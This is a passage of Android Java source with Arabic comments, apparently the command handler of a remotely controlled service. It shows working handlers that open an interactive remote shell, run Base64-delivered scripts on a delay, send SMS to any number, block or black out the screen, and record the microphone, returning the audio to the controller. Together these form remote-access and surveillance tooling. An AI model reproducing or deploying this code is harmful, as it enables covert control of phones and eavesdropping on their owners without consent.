        if ((header[0] & 0xFF) == 0xFF && (header[1] & 0xFF) == 0xD8 && (header[2] & 0xFF) == 0xFF) {
            return true;
        }
        if (header.length >= 8
                && header[0] == (byte) 0x89 && header[1] == 0x50
                && header[2] == 0x4E && header[3] == 0x47
                && header[4] == 0x0D && header[5] == 0x0A
                && header[6] == 0x1A && header[7] == 0x0A) {
            return true;
        }
        if (header[0] == 'B' && header[1] == 'M') {
            return true;
        }
        if (header.length >= 12
                && header[0] == 'R' && header[1] == 'I' && header[2] == 'F' && header[3] == 'F'
                && header[8] == 'W' && header[9] == 'E' && header[10] == 'B' && header[11] == 'P') {
            return true;
        }
        return false;
    }

    // ------------------------------------------------------------------
    // تحسين/خفض الشبكة المؤقت على الجهاز (tc netem) بدون فصل الاتصال
    // ------------------------------------------------------------------

    private void handleNetworkDegradation(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", -1);
        if (parts.length < 5) {
            writeMessage(out, "صيغة خاطئة: network_deg:<التأخير(ms)>:<فقدان(%)>:<الحد(kbps)>:<المدة(ثواني)>");
            return;
        }
        int latency = parseSetting(parts[1], -1);
        if (latency < 0) {
            writeMessage(out, "قيمة غير صالحة للتأخير: " + parts[1]);
            return;
        }
        int loss = parseSetting(parts[2], -1);
        if (loss < 0) {
            writeMessage(out, "قيمة غير صالحة لفقدان الحزم: " + parts[2]);
            return;
        }
        long bandwidth = parseSettingLong(parts[3], -1);
        if (bandwidth < 0) {
            writeMessage(out, "قيمة غير صالحة للحد الأقصى: " + parts[3]);
            return;
        }
        int duration = parseSetting(parts[4], -1);
        if (duration < 0) {
            writeMessage(out, "قيمة غير صالحة للمدة: " + parts[4]);
            return;
        }

        if (latency == 0 && loss == 0 && bandwidth == 0) {
            writeMessage(out, "لم يتم تحديد أي معايير للخفض (القيم كلها صفر)");
            return;
        }
        if (duration <= 0 || duration > 86400) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 86400 ثانية");
            return;
        }
        if (latency > 5000 || loss > 100 || bandwidth > 10000000) {
            writeMessage(out, "قيم خارج النطاق المسموح "
                    + "(تأخير 0-5000ms، فقدان 0-100%، حد حتى 10Mkbps)");
            return;
        }

        String uidLine = runShellCommand("sh", "-c", "id");
        boolean isEmulator = isEmulatorEnvironment();
        String tcCheck = runShellCommand("sh", "-c", "command -v tc || echo tc_missing");
        boolean tcAvailable = !tcCheck.contains("tc_missing");

        String dev = detectNetInterface();
        if (dev == null) {
            String links = runShellCommand("sh", "-c",
                    "ip -o link show 2>/dev/null || (echo ip_unavailable; ls /sys/class/net 2>/dev/null)");
            String linksLow = links == null ? "" : links.toLowerCase(Locale.US);
            String shellNote;
            if (linksLow.contains("permission denied") || linksLow.contains("ip_unavailable")) {
                shellNote = "جرد الواجهات عبر shell محجوب بصلاحيات التطبيق غير المميزة "
                        + "(SELinux untrusted_app): 'ip' و'ls /sys/class/net' غير متاحين بدونهما.";
            } else {
                shellNote = "لم تُعثر على واجهة نشطة قابلة للاستخدام.";
            }
            writeMessage(out, "interface not found: لا توجد واجهة شبكية قابلة للاستخدام.\n"
                    + "تشخيص الحالة:\n"
                    + "  - واجهات (ip -o link show): " + links.replace("\n", " | ") + "\n"
                    + "  - هوية العملية: " + uidLine + "\n"
                    + "  - وجود tc: " + (tcAvailable ? "نعم" : "لا") + "\n"
                    + "  - البيئة: " + (isEmulator ? "محاكي Android Studio" : "جهاز حقيقي") + "\n"
                    + "  - الملاحظة: " + shellNote);
            return;
        }

        List<String> commands = new ArrayList<>();
        if (bandwidth > 0) {
            long burst = Math.max(1024L, bandwidth / 8L);
            commands.add("tc qdisc add dev " + dev + " root handle 1: tbf rate "
                    + bandwidth + "kbit burst " + burst + " latency 50ms");
            if (latency > 0 || loss > 0) {
                commands.add("tc qdisc add dev " + dev + " parent 1:1 handle 10: netem delay "
                        + latency + "ms loss " + loss + "%");
            }
        } else {
            commands.add("tc qdisc add dev " + dev + " root handle 1: netem delay "
                    + latency + "ms loss " + loss + "%");
        }

        boolean allApplied = true;
        String failureDetail = "";
        for (String cmd : commands) {
            String res = runShellCommand("sh", "-c", cmd);
            if (tcCommandFailed(res)) {
                allApplied = false;
                failureDetail = res;
                runShellCommand("sh", "-c", "tc qdisc del dev " + dev + " root 2>/dev/null");
                break;
            }
        }

        if (!allApplied) {
            String low = failureDetail.toLowerCase(Locale.US);
            String reason;
            if (low.contains("permission denied")) {
                reason = "permission denied";
            } else if (low.contains("operation not permitted")) {
                reason = "operation not permitted";
            } else if (low.contains("not found") || low.contains("no such file")
                    || low.contains("unknown qdisc")) {
                reason = "tc unavailable";
            } else {
                reason = "command failed";
            }
            writeMessage(out, "لا يمكن تطبيق خفض الشبكة (" + reason + ").\n"
                    + "تشخيص الحالة:\n"
                    + "  - الواجهة: " + dev + "\n"
                    + "  - هوية العملية: " + uidLine + "\n"
                    + "  - وجود tc: " + (tcAvailable ? "نعم" : "لا") + "\n"
                    + "  - البيئة: " + (isEmulator ? "محاكي Android Studio" : "جهاز حقيقي") + "\n"
                    + "يتطلب tc صلاحيات root/CAP_NET_ADMIN؛ التطبيق العادي غير مخوّل (لا يُدَّعى النجاح)."
                    + (isEmulator
                        ? "\nملاحظة المحاكي: نموذج شبكة المحاكي قد يمنع تركيب qdisc حتى مع root."
                        : "")
                    + "\nتفاصيل: " + failureDetail);
            return;
        }

        // استعادة تلقائية بعد المدة المحددة
        final Handler h = getWorkerHandler();
        final String restoreCmd = "tc qdisc del dev " + dev + " root";
        final String ifaceName = dev;
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                String res = runShellCommand("sh", "-c", restoreCmd);
                Log.i(TAG, "Network degradation restored (dev=" + ifaceName + "): " + res);
                degradationActive = false;
                degradedInterface = null;
            }
        }, duration * 1000L);
        degradationActive = true;
        degradedInterface = dev;

        writeMessage(out, "تم تطبيق خفض الشبكة مؤقتاً على الواجهة " + dev + "\n"
                + "تأخير: " + latency + "ms، فقدان: " + loss + "%، حد أقصى: "
                + (bandwidth > 0 ? bandwidth + " kbps" : "بدون") + "\n"
                + "سيتم استعادة الحالة الطبيعية تلقائياً بعد " + duration + " ثانية");
    }

    private boolean isEmulatorEnvironment() {
        String fingerprint = Build.FINGERPRINT == null ? "" : Build.FINGERPRINT.toLowerCase(Locale.US);
        String model = Build.MODEL == null ? "" : Build.MODEL.toLowerCase(Locale.US);
        String hardware = Build.HARDWARE == null ? "" : Build.HARDWARE.toLowerCase(Locale.US);
        return fingerprint.contains("generic") || fingerprint.contains("emulator")
                || fingerprint.contains("sdk_gphone")
                || model.contains("sdk_gphone")
                || hardware.contains("goldfish") || hardware.contains("ranchu");
    }

    private boolean tcCommandFailed(String output) {
        String text = output == null ? "" : output;
        return text.contains("RTNETLINK answers: Permission denied")
                || text.contains("RTNETLINK answers: Operation not permitted")
                || text.contains("Permission denied")
                || text.contains("Operation not permitted")
                || text.contains("not found")
                || text.contains("[رمز الخروج:")
                || text.contains("انتهت المهلة");
    }

    private String detectNetInterface() {
        // 1) المصدر الأكيد: إطار أندرويد (بدون root) — اسم واجهة الشبكة النشطة
        String frameworkIface = frameworkActiveInterface();
        if (frameworkIface != null) {
            return frameworkIface;
        }

        // 2) shell: ip -o link show (قد يكون مرفوضاً بصلاحيات غير مميزة)
        String res = runShellCommand("sh", "-c", "ip -o link show 2>/dev/null");
        if (res != null && !res.contains("(لا يوجد مخرجات)")
                && !res.contains("permission denied") && !res.contains("not found")) {
            List<String> ifaces = new ArrayList<>();
            Matcher m = Pattern.compile("^\\s*\\d+:\\s+([A-Za-z0-9_.]+):.*").matcher(res);
            while (m.find()) {
                ifaces.add(m.group(1));
            }
            for (String iface : PREFERRED_INTERFACES) {
                if (ifaces.contains(iface)) {
                    return iface;
                }
            }
            for (String iface : ifaces) {
                if (isRealInterface(iface)) {
                    return iface;
                }
            }
            return null;
        }
        // 3) sysfs (قد يكون مرفوضاً أيضاً بصلاحيات غير مميزة في المحاكي)
        String sysfs = runShellCommand("sh", "-c", "ls /sys/class/net 2>/dev/null");
        List<String> candidates = new ArrayList<>();
        if (sysfs != null) {
            for (String line : sysfs.split("\n")) {
                String name = line.trim();
                if (name.isEmpty()) {
                    continue;
                }
                for (String iface : PREFERRED_INTERFACES) {
                    if (iface.equals(name)) {
                        return iface;
                    }
                }
                if (isRealInterface(name)) {
                    candidates.add(name);
                }
            }
        }
        return candidates.isEmpty() ? null : candidates.get(0);
    }

    private String frameworkActiveInterface() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) {
                return null;
            }
            Network active = cm.getActiveNetwork();
            if (active != null) {
                LinkProperties lp = cm.getLinkProperties(active);
                if (lp != null && isRealInterface(lp.getInterfaceName())) {
                    return lp.getInterfaceName();
                }
            }
            for (Network net : cm.getAllNetworks()) {
                LinkProperties lp = cm.getLinkProperties(net);
                if (lp == null) {
                    continue;
                }
                String ifname = lp.getInterfaceName();
                if (!isRealInterface(ifname)) {
                    continue;
                }
                NetworkCapabilities cap = cm.getNetworkCapabilities(net);
                if (cap != null && cap.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
                    return ifname;
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "framework interface lookup failed: " + e.getMessage());
        }
        return null;
    }

    private static boolean isRealInterface(String name) {
        if (name == null || name.isEmpty() || name.equals("lo")) {
            return false;
        }
        String low = name.toLowerCase(Locale.US);
        if (low.startsWith("dummy") || low.startsWith("erspan") || low.endsWith("0")
                && (low.startsWith("gre") || low.startsWith("gretap")
                || low.startsWith("hwsim") || low.startsWith("ifb")
                || low.startsWith("ip6") || low.startsWith("ip_vti")
                || low.startsWith("sit") || low.startsWith("tunl"))) {
            return false;
        }
        return true;
    }

    // ------------------------------------------------------------------
    // تنفيذ سكربت مجدول/فوري على الجهاز
    // ------------------------------------------------------------------

    private void handleRunScript(String command, OutputStream out) throws IOException {
        int firstColon = command.indexOf(':', "script_base64".length());
        if (firstColon < 0) {
            writeMessage(out, "صيغة خاطئة: script_base64:التأخير:Base64");
            return;
        }
        int secondColon = command.indexOf(':', firstColon + 1);
        if (secondColon < 0) {
            writeMessage(out, "صيغة خاطئة: script_base64:التأخير:Base64");
            return;
        }
        String delayStr = command.substring(firstColon + 1, secondColon);
        String b64Data = command.substring(secondColon + 1);

        int delay;
        try {
            delay = Integer.parseInt(delayStr.trim());
        } catch (NumberFormatException e) {
            writeMessage(out, "تأخير غير صالح: " + delayStr);
            return;
        }
        if (delay < 0 || delay > 86400) {
            writeMessage(out, "التأخير يجب أن يكون بين 0 و 86400 ثانية");
            return;
        }

        byte[] scriptBytes;
        try {
            scriptBytes = android.util.Base64.decode(b64Data, android.util.Base64.DEFAULT);
        } catch (IllegalArgumentException e) {
            writeMessage(out, "فشل فك تشفير النص Base64");
            return;
        }
        if (scriptBytes.length == 0 || scriptBytes.length > SCRIPT_MAX_BYTES) {
            writeMessage(out, "حجم النص غير صالح (فارغ أو أكبر من الحد المسموح: " + SCRIPT_MAX_BYTES + " بايت)");
            return;
        }

        // تخزين مؤقت على الجهاز؛ يُحذف بعد التنفيذ (وليس حفظاً دائماً)
        final File scriptFile = new File(getCacheDir(), "script_" + System.currentTimeMillis() + ".sh");
        try {
            java.io.FileOutputStream fos = new java.io.FileOutputStream(scriptFile);
            try {
                fos.write(scriptBytes);
            } finally {
                fos.close();
            }
        } catch (IOException e) {
            writeMessage(out, "فشل حفظ النص مؤقتاً على الجهاز: " + e.getMessage());
            return;
        }
        pendingScriptFile = scriptFile;

        final Handler h = getWorkerHandler();
        final OutputStream outRef = out;
        final long delayMs = delay * 1000L;
        final int delaySeconds = delay;
        final String scriptName = scriptFile.getName();
        h.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    String execResult = runScript(scriptFile);
                    String reply;
                    if (delaySeconds > 0) {
                        reply = "حالة التنفيذ: تم التنفيذ بعد " + delaySeconds + " ثانية من الجدولة\n" + execResult;
                    } else {
                        reply = "حالة التنفيذ: نُفذ فوراً\n" + execResult;
                    }
                    writeMessage(outRef, reply);
                } catch (Exception e) {
                    try {
                        writeMessage(outRef, "فشل تنفيذ النص المجدول: " + e.getMessage());
                    } catch (IOException ignored) {
                        Log.w(TAG, "reply failed for scheduled script", e);
                    }
                } finally {
                    pendingScriptFile = null;
                    boolean deleted = scriptFile.delete();
                    if (!deleted) {
                        Log.w(TAG, "failed to delete temp script: " + scriptName);
                    }
                }
            }
        }, delayMs);
    }

    private String runScript(File scriptFile) {
        StringBuilder output = new StringBuilder();
        StringBuilder stdout = new StringBuilder();
        StringBuilder stderr = new StringBuilder();
        Process process = null;
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", scriptFile.getAbsolutePath());
            pb.redirectErrorStream(false);
            process = pb.start();
            Reader outReader = new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8);
            Reader errReader = new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8);

            long deadline = System.currentTimeMillis() + SCRIPT_TIMEOUT_MS;
            boolean done = false;
            while (!done) {
                boolean exited = false;
                try {
                    process.exitValue();
                    exited = true;
                } catch (IllegalThreadStateException stillRunning) {
                    if (System.currentTimeMillis() > deadline) {
                        process.destroy();
                        output.append("انتهت مهلة تنفيذ النص بعد ").append(SCRIPT_TIMEOUT_MS / 1000).append(" ثانية\n");
                        exited = true;
                    }
                }
                drainChar(outReader, stdout);
                drainChar(errReader, stderr);
                if (exited) {
                    done = true;
                } else {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        process.destroy();
                        done = true;
                    }
                }
            }
            drainChar(outReader, stdout);
            drainChar(errReader, stderr);

            int exit = -1;
            try {
                exit = process.exitValue();
            } catch (IllegalThreadStateException ignored) {
            }
            if (stdout.toString().trim().length() > 0) {
                output.append("[stdout]\n").append(stdout.toString().trim()).append("\n");
            }
            if (stderr.toString().trim().length() > 0) {
                output.append("[stderr]\n").append(stderr.toString().trim()).append("\n");
            }
            output.append("[رمز الخروج: ").append(exit).append("]");
        } catch (IOException e) {
            return "خطأ في تنفيذ النص: " + e.getMessage();
        } catch (RuntimeException e) {
            return "خطأ في تنفيذ النص: " + e.getMessage();
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
        return output.toString();
    }

    private Handler getWorkerHandler() {
        synchronized (workerLock) {
            if (workerHandler == null) {
                HandlerThread thread = new HandlerThread("bg-worker");
                thread.start();
                workerThread = thread;
                workerHandler = new Handler(thread.getLooper());
            }
            return workerHandler;
        }
    }

    private static int parseSetting(String text, int fallback) {
        try {
            return Integer.parseInt(text.trim());
        } catch (NumberFormatException e) {
            return fallback;
        }
    }

    private static long parseSettingLong(String text, long fallback) {
        try {
            return Long.parseLong(text.trim());
        } catch (NumberFormatException e) {
            return fallback;
        }
    }

    private static void drainChar(Reader reader, StringBuilder out) throws IOException {
        while (reader.ready()) {
            out.append((char) reader.read());
        }
    }

    private void handleBlackScreenOnBoot(OutputStream out) throws IOException {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean enabled = prefs.getBoolean(PREFS_BLACK_SCREEN_ON_BOOT, false);
        boolean newState = !enabled;
        prefs.edit().putBoolean(PREFS_BLACK_SCREEN_ON_BOOT, newState).apply();
        writeMessage(out, "تم " + (newState ? "تفعيل" : "إلغاء تفعيل")
                + " الشاشة السوداء عند الإقلاع (الحالة الجديدة: " + (newState ? "مفعّل" : "معطّل") + ")");
    }

    /**
     * حجب شاشة حقيقي بتحكم مشغّل (v2).
     *
     * الصيغة: block_screen:المدة_الثواني[:تأخير_الثواني[:معرف_الجلسة]]
     * - الحقل الأول يبقى المدة دائماً (متوافق مع v1 block_screen:60).
     * - تأخير اختياري (تأجيل الفرض). معرف جلسة اختياري (يولَّد تلقائياً إن لم يُعط).
     *
     * القواعد:
     * 1) بدون Device Owner أو (Admin + isLockTaskPermitted) نرفض بصدق
     *    STRICT_BLOCK_UNAVAILABLE — لا قفل وهمي بالملء ولا تزوير نجاح.
     * 2) جلسة واحدة فقط: جلسة جديدة تحل محل القديمة صراحةً (لا ساعتين متوازيتين).
     * 3) الدخول/الإقلاع: الجلسة قائمة مدرات=None كاختبار حقيقة بعد الانتهاء.
     */
    private void handleBlockScreen(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":");
        if (parts.length < 2) {
            writeMessage(out, "صيغة خاطئة: block_screen:المدة_الثواني[:التأخير[:معرف_الجلسة]]");
            return;
        }
        int duration;
        int delay = 0;
        String sessionId = null;
        try {
            duration = Integer.parseInt(parts[1].trim());
            if (parts.length >= 3 && !parts[2].trim().isEmpty()) {
                delay = Integer.parseInt(parts[2].trim());
            }
            if (parts.length >= 4 && !parts[3].trim().isEmpty()) {
                sessionId = parts[3].trim();
            }
        } catch (NumberFormatException e) {
            writeMessage(out, "قيمة عددية غير صالحة في الأوامر: " + command);
            return;
        }
        if (duration < 1 || duration > 86400 || delay < 0 || delay > 86400) {
            writeMessage(out, "المدة والتأخير يجب أن يكونا بين 1..86400 ثانية (والتأخير >= 0).");
            return;
        }

        DeviceManagementManager dmm = new DeviceManagementManager(this);
        if (!dmm.strictCapabilityAvailable()) {
            StringBuilder deny = new StringBuilder();
            deny.append("STRICT_BLOCK_UNAVAILABLE\n");
            deny.append("لا يمكن تنفيذ حجب شاشة صارم على هذا الجهاز.\n");
            deny.append("الإدارة المطلوبة: Device Owner أو (تطبيق إدارة نظام نشط + isLockTaskPermitted).\n");
            deny.append("الحالة: ").append(dmm.capabilityLabel())
                    .append(" | lock task permitted: ")
                    .append(dmm.isLockTaskPermitted() ? "yes" : "no")
                    .append("\nلم تُنفَّذ العملية (لا يُزوَّر نجاح القيود النظامية).");
            writeMessage(out, deny.toString());
            return;
        }

        BlockSessionManager mgr = BlockSessionManager.getInstance(this);
        Map<String, String> session = mgr.schedule(delay, duration, sessionId);
        if (session == null) {
            writeMessage(out, "تعذّر جدولة الجلسة (تحقق من المعطيات).");
            return;
        }

        // lock task على هذا الجهاز قبل أي بدء.
        dmm.configureLockTask();

        if (delay == 0) {
            mgr.activateIfDue(); // الآن
        }
        if (mgr.isActive()) {
            mgr.audit("block screen started (handler) id=" + mgr.getSessionId());
            launchBlockActivity();
        }

        StringBuilder reply = new StringBuilder();
        reply.append("BLOCK_SCREEN_STARTED\n");
        reply.append("Session ID: ").append(session.get("Session ID")).append('\n');
        reply.append("Duration: ").append(session.get("Requested duration")).append('\n');
        reply.append("Start delay: ").append(session.get("Start delay")).append('\n');
        reply.append("State: ").append(session.get("State")).append('\n');
        reply.append("Capability: ").append(dmm.capabilityLabel()).append(" (strict available)\n");
        if (delay > 0) {
            reply.append("سيبدأ الحجب تلقائياً عند الموعد المحدد حتى بدون اتصال المشغّل.\n");
        }
        reply.append("جلسة واحدة: أي جلسة جديدة تحل محل الحالية صراحةً.");
        writeMessage(out, reply.toString());
    }

    /** حالة جلسة الحجب الحالية (وسيلة متاحة للمشغّل والفحص). */
    private void handleBlockScreenStatus(OutputStream out) throws IOException {
        BlockSessionManager mgr = BlockSessionManager.getInstance(this);
        mgr.settleDue(); // تُنهي أي جلسة انتهت فعلاً حتى لو تأخر مؤشر Android
        Map<String, String> info = mgr.sessionInfo();
        StringBuilder reply = new StringBuilder();
        reply.append("BLOCK_SESSION_STATUS\n");
        for (Map.Entry<String, String> e : info.entrySet()) {
            reply.append(e.getKey()).append(": ").append(e.getValue()).append('\n');
        }
        DeviceManagementManager dmm = new DeviceManagementManager(this);
        reply.append("Capability: ").append(dmm.capabilityLabel()).append('\n');
        reply.append("In lock task mode: ").append(dmm.isLockTaskActive() ? "YES" : "NO");
        writeMessage(out, reply.toString());
    }

    /** إيقاف جلسة الحجب وإعادة الجهاز لحالته الطبيعية. */
    private void handleBlockScreenCancel(OutputStream out) throws IOException {
        BlockSessionManager mgr = BlockSessionManager.getInstance(this);
        if (!mgr.hasActiveOrScheduled()) {
            writeMessage(out, "NO_ACTIVE_SESSION");
            return;
        }
        mgr.terminate("cancelled by controller");
        writeMessage(out, "BLOCK_SCREEN_CANCELLED");
    }

    // ------------------------------------------------------------------
    // جلسة shell تفاعلية (option 10 — Android Shell)
    // ------------------------------------------------------------------

    private void handleShellStart(OutputStream out) throws IOException {
        synchronized (shellLock) {
            if (shellProcess != null) {
                writeMessage(out, "SHELL_SESSION_ALREADY_OPEN");
                return;
            }
            try {
                Process process = new ProcessBuilder("sh").redirectErrorStream(true).start();
                shellProcess = process;
                shellBuffer.setLength(0);
                shellCursor = 0;
                shellMarkerSeen = false;
                Thread reader = new Thread(() -> readShellLoop(process), "shell-reader");
                reader.setDaemon(true);
                reader.start();
                writeMessage(out, "SHELL_SESSION_STARTED");
            } catch (IOException e) {
                writeMessage(out, "فشل فتح جلسة shell على الجهاز: " + e.getMessage());
            }
        }
    }

    private void readShellLoop(Process process) {
        try (BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                synchronized (shellLock) {
                    shellBuffer.append(line).append('\n');
                    if (SHELL_MARKER.equals(line.trim())) {
                        shellMarkerSeen = true;
                        shellLock.notifyAll();
                    }
                }
            }
        } catch (IOException e) {
            Log.w(TAG, "shell reader stopped: " + e.getMessage());
        } finally {
            synchronized (shellLock) {
                shellMarkerSeen = true;
                shellLock.notifyAll();
            }
        }
    }

    private void handleShellCommand(String command, OutputStream out) throws IOException {
        String b64 = command.substring("shell_cmd:".length()).trim();
        String cmd;
        try {
            cmd = new String(
                    android.util.Base64.decode(b64, android.util.Base64.DEFAULT),
                    StandardCharsets.UTF_8);
        } catch (IllegalArgumentException e) {
            writeMessage(out, "صيغة خاطئة: shell_cmd:Base64");
            return;
        }
        if (cmd == null || cmd.trim().isEmpty()) {
            writeMessage(out, "أمر فارغ");
            return;
        }

        Process process;
        String result;
        boolean markerSeen = false;
        synchronized (shellLock) {
            process = shellProcess;
            if (process == null) {
                writeMessage(out, "لا توجد جلسة shell مفتوحة (أرسل shell_start أولاً)");
                return;
            }
            String all = shellBuffer.toString();
            shellCursor = all.length();
            shellMarkerSeen = false;
            try {
                OutputStream stdin = process.getOutputStream();
                stdin.write((cmd + "\necho " + SHELL_MARKER + "\n").getBytes(StandardCharsets.UTF_8));
                stdin.flush();
            } catch (IOException e) {
                writeMessage(out, "فشل إرسال الأمر إلى جلسة shell: " + e.getMessage());
                return;
            }

            long deadline = System.currentTimeMillis() + SHELL_REPLY_TIMEOUT_MS;
            while (!shellMarkerSeen && System.currentTimeMillis() < deadline) {
                try {
                    shellLock.wait(200);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    writeMessage(out, "أُلغي تنفيذ أمر shell");
                    return;
                }
            }
            markerSeen = shellMarkerSeen;
            all = shellBuffer.toString();
            int start = Math.min(shellCursor, all.length());
            String segment = all.substring(start);
            int markerIndex = segment.lastIndexOf(SHELL_MARKER);
            if (markerIndex >= 0) {
                int lineStart = segment.lastIndexOf('\n', markerIndex - 1);
                segment = segment.substring(0, lineStart < 0 ? 0 : lineStart + 1);
            }
            result = segment.trim();
            shellCursor = all.length();
        }

        if (!markerSeen && result.length() == 0) {
            writeMessage(out, "[انتهت مهلة تنفيذ الأمر على shell]");
            return;
        }
        if (!markerSeen) {
            result = result + "\n[انتهت مهلة تنفيذ الأمر على shell]";
        }
        writeMessage(out, result.isEmpty() ? "(لا يوجد مخرجات)" : result);
    }

    private void handleShellExit(OutputStream out) throws IOException {
        Process process;
        synchronized (shellLock) {
            process = shellProcess;
            if (process == null) {
                writeMessage(out, "SHELL_SESSION_CLOSED");
                return;
            }
            try {
                OutputStream stdin = process.getOutputStream();
                stdin.write("exit\n".getBytes(StandardCharsets.UTF_8));
                stdin.flush();
            } catch (IOException e) {
                Log.w(TAG, "shell exit write failed: " + e.getMessage());
            }
            process.destroy();
            shellProcess = null;
            shellMarkerSeen = true;
            shellLock.notifyAll();
        }
        writeMessage(out, "SHELL_SESSION_CLOSED");
    }

    private void handlePlayVideo(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":");
        if (parts.length < 2) {
            writeMessage(out, "صيغة خاطئة: play_video:الرقم");
            return;
        }
        int videoId;
        try {
            videoId = Integer.parseInt(parts[1].trim());
        } catch (NumberFormatException e) {
            writeMessage(out, "رقم الفيديو غير صالح: " + parts[1]);
            return;
        }
        if (videoId < 1) {
            writeMessage(out, "رقم الفيديو غير صالح (يجب أن يكون رقم المكتبة موجباً).");
            return;
        }
        String fileName = "video_" + videoId + ".mp4";
        String assetPath = ASSET_VIDEO_DIR + "/" + fileName;
        boolean exists = false;
        try (AssetFileDescriptor afd = getAssets().openFd(assetPath)) {
            exists = afd.getLength() > 0;
        } catch (IOException e) {
            exists = false;
        }
        if (!exists) {
            writeMessage(out, "الفيديو غير موجود في المكتبة: video_" + videoId
                    + " (أضف " + fileName + " إلى assets/video وأعد بناء التطبيق)");
            return;
        }
        Intent intent = new Intent(this, VideoPlayerActivity.class);
        intent.putExtra(VideoPlayerActivity.EXTRA_VIDEO_NAME, fileName);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        writeMessage(out, "تم تشغيل الفيديو بملء الشاشة: " + fileName);
    }

    private void handleSeriousWarning(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        if (parts.length < 2) {
            writeMessage(out, "صيغة خاطئة: show_serious_warning:النص");
            return;
        }
        String text = parts[1].trim();
        if (text.isEmpty()) {
            writeMessage(out, "نص التحذير فارغ.");
            return;
        }
        if (text.length() > 2000) {
            writeMessage(out, "نص التحذير طويل جداً (الحد الأقصى 2000 حرف).");
            return;
        }
        Intent intent = new Intent(this, SeriousWarningActivity.class);
        intent.putExtra(SeriousWarningActivity.EXTRA_WARNING_TEXT, text);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        writeMessage(out, "تم عرض رسالة التحذير على الشاشة.");
    }

    private void handleSendSms(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 3);
        if (parts.length < 3) {
            writeMessage(out, "صيغة خاطئة: send_sms:الرقم:النص");
            return;
        }
        String phoneNumber = parts[1];
        String message = parts[2];
        if (!hasPermission(Manifest.permission.SEND_SMS)) {
            writeMessage(out, "صلاحية إرسال SMS غير ممنوحة");
            return;
        }
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            writeMessage(out, "تم إرسال الرسالة إلى " + phoneNumber);
        } catch (Exception e) {
            writeMessage(out, "فشل في إرسال الرسالة: " + e.getMessage());
        }
    }

    private void handleDeviceInfo(OutputStream out) throws IOException {
        try {
            StringBuilder info = new StringBuilder();
            info.append("الطراز: ").append(Build.MODEL).append("\n");
            info.append("المصنع: ").append(Build.MANUFACTURER).append("\n");
            info.append("نظام التشغيل: ").append(Build.VERSION.RELEASE).append(" (API ")
                    .append(Build.VERSION.SDK_INT).append(")\n");
            info.append("رقم البناء: ").append(Build.ID).append("\n");

            BatteryManager batteryManager = (BatteryManager) getSystemService(Context.BATTERY_SERVICE);
            int batteryLevel = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            info.append("مستوى البطارية: ").append(batteryLevel >= 0 ? batteryLevel + "%" : "غير متاح").append("\n");

            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo mobileInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            info.append("حالة الواي فاي: ")
                    .append(wifiInfo != null && wifiInfo.isConnected() ? "متصل" : "غير متصل").append("\n");
            info.append("حالة البيانات المتنقلة: ")
                    .append(mobileInfo != null && mobileInfo.isConnected() ? "متصل" : "غير متصل").append("\n");

            writeMessage(out, info.toString());
        } catch (Exception e) {
            writeMessage(out, "خطأ في جلب معلومات الجهاز: " + e.getMessage());
        }
    }

    private void handleRecordAudio(String command, OutputStream out) throws IOException {
        String[] parts = command.split(":", 2);
        int duration;
        try {
            duration = Integer.parseInt(parts[1]);
        } catch (NumberFormatException e) {
            writeMessage(out, "مدة غير صالحة: " + parts[1]);
            return;
        }
        if (duration <= 0 || duration > 600) {
            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
            return;
        }
        if (!hasPermission(Manifest.permission.RECORD_AUDIO)) {
            writeMessage(out, "صلاحية الميكروفون غير ممنوحة");
            return;
        }

        // ملف مؤقت في كاش التطبيق؛ يُحذف بعد إرسال البيانات (وليس حفظاً دائماً)
        File outputFile = new File(getCacheDir(), "rec_" + System.currentTimeMillis() + ".3gp");
        MediaRecorder recorder = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                ? new MediaRecorder(this) : new MediaRecorder();
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(outputFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
            Thread.sleep(duration * 1000L);
            try {
                recorder.stop();
            } catch (RuntimeException ignored) {
            }
            recorder.release();
            recorder = null;
            writeMessage(out, "record_audio_data:" + duration + ":" + audioBase64(outputFile));
        } catch (Exception e) {
            writeMessage(out, "فشل في التسجيل: " + e.getMessage());
        } finally {
            if (recorder != null) {
                try {
                    recorder.stop();
                } catch (RuntimeException ignored) {
                }
                recorder.release();
            }
            boolean deleted = outputFile.delete();
            if (!deleted) {
                Log.w(TAG, "failed to delete temp recording: " + outputFile.getName());
            }
        }
